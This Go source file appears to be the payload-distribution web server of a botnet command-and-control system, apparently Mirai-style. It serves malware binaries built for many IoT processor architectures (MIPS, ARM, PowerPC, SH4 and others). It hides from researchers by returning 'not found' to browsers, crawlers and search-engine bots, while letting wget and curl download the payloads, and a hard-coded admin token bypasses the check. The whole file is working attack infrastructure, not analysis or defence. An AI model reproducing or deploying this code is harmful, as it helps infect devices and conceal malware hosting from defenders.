package http

import (
	"cnc/core/config"
	"fmt"
	"log"
	"net/http"
	"path/filepath"
	"strings"
)

func isBrowserRequest(r *http.Request) bool {
	userAgent := strings.ToLower(r.UserAgent())

	
	browserPatterns := []string{
		"mozilla/5.0",   
		"chrome/",       
		"firefox/",      
		"safari/",       
		"edge/",         
		"opera/",        
		"msie",          
		"trident/",      
		"webkit",        
		"gecko/",        
		"presto/",       
		"mobile",        
		"android",       
		"iphone",        
		"ipad",          
		"windows phone", 
		"bot",           
		"crawler",       
		"spider",        
		"google",        
		"bing",          
		"yandex",        
		"baidu",         
		"curl/",         
	}

	
	allowedPatterns := []string{
		"wget",
		"^curl/", 
	}

	
	for _, pattern := range allowedPatterns {
		if strings.Contains(userAgent, pattern) {
			return false 
		}
	}

	
	for _, pattern := range browserPatterns {
		if strings.Contains(userAgent, pattern) {
			return true 
		}
	}

	
	if len(userAgent) < 5 {
		return false
	}

	
	
	if strings.Contains(userAgent, "http") || strings.Contains(userAgent, "client") {
		return false 
	}

	
	return true
}

func Serve() {
	staticDir := "assets/static"
	
	
	adminToken := "CHANGE_THIS_SECRET_TOKEN_12345"

	
	mux := http.NewServeMux()

	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		
		providedToken := r.URL.Query().Get("token")
		if providedToken == adminToken {
			
			
		} else {
			
			if isBrowserRequest(r) {
				http.NotFound(w, r)
				return
			}
		}

		if len(r.URL.Path) < 2 {
			http.ServeFile(w, r, filepath.Join(staticDir, "index.html"))
			return
		}

		
		path := strings.ToLower(r.URL.Path)
		isBinary := strings.HasSuffix(path, ".bin") ||
			strings.HasSuffix(path, ".elf") ||
			strings.HasSuffix(path, ".x86") ||
			strings.HasSuffix(path, ".x86_64") ||
			strings.HasSuffix(path, ".mips") ||
			strings.HasSuffix(path, ".mpsl") ||
			strings.HasSuffix(path, ".arm4") ||
			strings.HasSuffix(path, ".arm5") ||
			strings.HasSuffix(path, ".arm6") ||
			strings.HasSuffix(path, ".arm7") ||
			strings.HasSuffix(path, ".ppc") ||
			strings.HasSuffix(path, ".spc") ||
			strings.HasSuffix(path, ".m68k") ||
			strings.HasSuffix(path, ".sh4") ||
			strings.HasSuffix(path, ".arc") ||
			strings.HasSuffix(path, ".i486") ||
			strings.HasSuffix(path, ".i686") ||
			(!strings.Contains(path, ".") && len(path) > 1 && path != "/")

		if isBinary {
			
			accept := strings.ToLower(r.Header.Get("Accept"))
			if strings.Contains(accept, "text/html") ||
				strings.Contains(accept, "image/") ||
				strings.Contains(accept, "application/xhtml") {
				http.NotFound(w, r)
				return
			}
		}

		http.ServeFile(w, r, filepath.Join(staticDir, r.URL.Path))
	})

	log.Fatal(http.ListenAndServe(fmt.Sprintf(":%d", config.Config.WebServer.Http), mux))
}

func Serve2() {
	staticDir := "assets/static"
	
	
	adminToken := "CHANGE_THIS_SECRET_TOKEN_12345"

	
	mux2 := http.NewServeMux()

	mux2.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		
		providedToken := r.URL.Query().Get("token")
		if providedToken == adminToken {
			
			log.Printf("[http2] ALLOWED admin token request from %s for %s\n", r.RemoteAddr, r.URL.Path)
			
		} else {
			
			if isBrowserRequest(r) {
				http.NotFound(w, r)
				return
			}
		}

		if len(r.URL.Path) < 2 {
			http.ServeFile(w, r, filepath.Join(staticDir, "index.html"))
			return
		}

		
		path := strings.ToLower(r.URL.Path)
		isBinary := strings.HasSuffix(path, ".bin") ||
			strings.HasSuffix(path, ".elf") ||
			strings.HasSuffix(path, ".x86") ||
			strings.HasSuffix(path, ".x86_64") ||
			strings.HasSuffix(path, ".mips") ||
			strings.HasSuffix(path, ".mpsl") ||
			strings.HasSuffix(path, ".arm4") ||
			strings.HasSuffix(path, ".arm5") ||
			strings.HasSuffix(path, ".arm6") ||
			strings.HasSuffix(path, ".arm7") ||
			strings.HasSuffix(path, ".ppc") ||
			strings.HasSuffix(path, ".spc") ||
			strings.HasSuffix(path, ".m68k") ||
			strings.HasSuffix(path, ".sh4") ||
			strings.HasSuffix(path, ".arc") ||
			strings.HasSuffix(path, ".i486") ||
			strings.HasSuffix(path, ".i686") ||
			(!strings.Contains(path, ".") && len(path) > 1 && path != "/")

		if isBinary {
			
			accept := strings.ToLower(r.Header.Get("Accept"))
			if strings.Contains(accept, "text/html") ||
				strings.Contains(accept, "image/") ||
				strings.Contains(accept, "application/xhtml") {
				http.NotFound(w, r)
				return
			}
		}

		http.ServeFile(w, r, filepath.Join(staticDir, r.URL.Path))
	})

	log.Fatal(http.ListenAndServe(fmt.Sprintf(":%d", config.Config.WebServer.Http2), mux2))
}
